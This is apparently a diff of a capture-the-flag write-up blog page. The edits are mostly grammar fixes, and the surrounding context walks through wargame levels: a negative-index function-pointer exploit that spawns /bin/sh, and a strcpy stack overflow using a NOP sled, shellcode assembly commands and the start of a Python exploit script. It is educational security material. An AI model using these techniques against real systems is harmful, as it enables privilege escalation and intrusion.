@@ -192,8 +192,8 @@ chmod +x date
 
 &lt;h3&gt;Description of the Exploit&lt;/h3&gt;
 &lt;p&gt;To understand this problem we need to understand the &lt;a href="http://bt3gl.github.io/smashing-the-stack-for-fun-or-wargames-narnia-0-4.html"&gt;design of the stack frame&lt;/a&gt;.  With this in mind, the exploit is crafted as following:&lt;/p&gt;
-&lt;p&gt;1) We create a malicious index that is negative (so it pass the bound checking) to  have a shell running &lt;code&gt;system("/bin/sh");&lt;/code&gt; (which will be able to read password o level3 because it will have its &lt;a href="http://en.wikipedia.org/wiki/User_identifier_(Unix)"&gt;UID&lt;/a&gt;).&lt;/p&gt;
-&lt;p&gt;2) We first need to find a memory location before &lt;strong&gt;fns&lt;/strong&gt; (which should be writable). We fire up &lt;strong&gt;gdb&lt;/strong&gt; and search for the pointer to &lt;strong&gt;buf&lt;/strong&gt;, which is right before &lt;strong&gt;fns&lt;/strong&gt; (this is different each time due to &lt;a href="http://en.wikipedia.org/wiki/Address_space_layout_randomization"&gt;ASLR&lt;/a&gt;):&lt;/p&gt;
+&lt;p&gt;1) We input a malicious index that is negative (so it pass the bound checking) to  have a shell running &lt;code&gt;system("/bin/sh");&lt;/code&gt; (which will be able to read password of level3 because it will have its &lt;a href="http://en.wikipedia.org/wiki/User_identifier_(Unix)"&gt;UID&lt;/a&gt;).&lt;/p&gt;
+&lt;p&gt;2) We first need to find the memory location before &lt;strong&gt;fns&lt;/strong&gt; (which should be writable). We fire up &lt;strong&gt;gdb&lt;/strong&gt; and search for the pointer to &lt;strong&gt;buf&lt;/strong&gt;, which is right before &lt;strong&gt;fns&lt;/strong&gt; (this is different each time due to &lt;a href="http://en.wikipedia.org/wiki/Address_space_layout_randomization"&gt;ASLR&lt;/a&gt;):&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;  &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;
     &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;64&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="mh"&gt;0xffbffa00&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
@@ -206,7 +206,7 @@ chmod +x date
 
 
 &lt;p&gt;So running an argument such as &lt;em&gt;/level/level03 -27 foo&lt;/em&gt; calls &lt;strong&gt;fns[-27]&lt;/strong&gt; which is &lt;strong&gt;&amp;amp;fns-27&lt;/strong&gt; times the size of the pointer.&lt;/p&gt;
-&lt;p&gt;4) We assign &lt;strong&gt;buf&lt;/strong&gt; to a shellcode that will spawn the privileged terminal using the function &lt;strong&gt;run&lt;/strong&gt;, which is at:&lt;/p&gt;
+&lt;p&gt;4) We will assign &lt;strong&gt;buf&lt;/strong&gt; to a shellcode that will spawn the privileged terminal using the function &lt;strong&gt;run&lt;/strong&gt;, which is at:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;
   &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="k"&gt;const&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="mh"&gt;0x80484ac&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
@@ -244,10 +244,10 @@ chmod +x date
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;In this challenge, the input string is received by the function &lt;strong&gt;fun&lt;/strong&gt;, and then it is  copied to the buffer. Since &lt;code&gt;strcp&lt;/code&gt; does not do bound checking, if our string is larger than 1024 characters, it  keeps copying until it reaches a NULL byte (0x00).  This  &lt;a href="http://phrack.org/issues/49/14.html#article"&gt;overflows the stack&lt;/a&gt; and  makes it possible to rewrite the &lt;strong&gt;function return address&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;In this challenge, the input string is received by the function &lt;strong&gt;fun&lt;/strong&gt;, and then it is  copied to the buffer. Since &lt;code&gt;strcp&lt;/code&gt; does not perform bound checking, if our string is larger than 1024 characters, it  will keep copying until it reaches a NULL byte (0x00).  This  &lt;a href="http://phrack.org/issues/49/14.html#article"&gt;overflows the stack&lt;/a&gt; and  makes it possible to rewrite the &lt;strong&gt;function return address&lt;/strong&gt;.&lt;/p&gt;
 &lt;p&gt;The input for the &lt;strong&gt;fun&lt;/strong&gt; function is going to be  1024 bytes (which starts at &lt;strong&gt;&amp;amp;buf&lt;/strong&gt;) with several &lt;a href="http://en.wikipedia.org/wiki/NOP"&gt;NOPs&lt;/a&gt; plus the shellcode. The overflowed bytes have pointers to the address of &lt;strong&gt;buf&lt;/strong&gt; (&lt;strong&gt;&amp;amp;buf&lt;/strong&gt;). We use NOPs because the system uses stack randomization. If &lt;strong&gt;&amp;amp;buf&lt;/strong&gt; points to any of the NOPs, the shellcode will be executed.&lt;/p&gt;
 &lt;h3&gt;Yet Another Shellcode Introduction&lt;/h3&gt;
-&lt;p&gt;Shellcode can either be crafted directly in Assembly, or reproduced in C and then disassemble it &lt;strong&gt;gdb&lt;/strong&gt; and &lt;strong&gt;objdump&lt;/strong&gt;. The second option is more prone to errors.&lt;/p&gt;
+&lt;p&gt;Shellcode can either be crafted directly in Assembly, or reproduced in C and then disassembled in &lt;strong&gt;gdb&lt;/strong&gt; and &lt;strong&gt;objdump&lt;/strong&gt;. The second approach is more prone to errors.&lt;/p&gt;
 &lt;p&gt;Let's write the simplest shellcode we can think of, which simply spawns a shell:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
 &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
@@ -341,17 +341,17 @@ chmod +x date
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;To assemble and link this in a 32-bit machine you do:&lt;/p&gt;
+&lt;p&gt;To assemble and link this in a 32-bit machine we do:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;as&lt;/span&gt;  &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;o&lt;/span&gt; &lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;o&lt;/span&gt;   &lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;
 &lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;ld&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;o&lt;/span&gt; &lt;span class="n"&gt;shell&lt;/span&gt; &lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;o&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;However, in a 64-but machine you:&lt;/p&gt;
+&lt;p&gt;In a 64-but machine, we do:&lt;/p&gt;
 &lt;ol&gt;
 &lt;li&gt;Add &lt;strong&gt;.code32&lt;/strong&gt; in the top of the Assembly code.&lt;/li&gt;
-&lt;li&gt;Assemble with the --32 flag.&lt;/li&gt;
-&lt;li&gt;Link with the -m elf_i386 flag.&lt;/li&gt;
+&lt;li&gt;Assemble with the &lt;strong&gt;--32 flag&lt;/strong&gt;.&lt;/li&gt;
+&lt;li&gt;Link with the &lt;strong&gt;-m elf_i386&lt;/strong&gt; flag.&lt;/li&gt;
 &lt;/ol&gt;
 &lt;p&gt;Resulting on:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;as&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;o&lt;/span&gt; &lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;o&lt;/span&gt;   &lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;
@@ -384,7 +384,7 @@ chmod +x date
 
 
 &lt;h3&gt;Solving the Problem&lt;/h3&gt;
-&lt;p&gt;Now, all we need to do is to write a snippet in any language which takes that shellcode and some NOPs to overflow the stack of the &lt;em&gt;level04&lt;/em&gt; binary. We write the exploit in Python:&lt;/p&gt;
+&lt;p&gt;Now, all we need to do is writing a snippet in any language which takes that shellcode and some NOPs to overflow the stack of the &lt;em&gt;level04&lt;/em&gt;'s' binary. We write the exploit in Python:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;struct&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;subprocess&lt;/span&gt;
 
 &lt;span class="n"&gt;STACK&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x0804857b&lt;/span&gt;
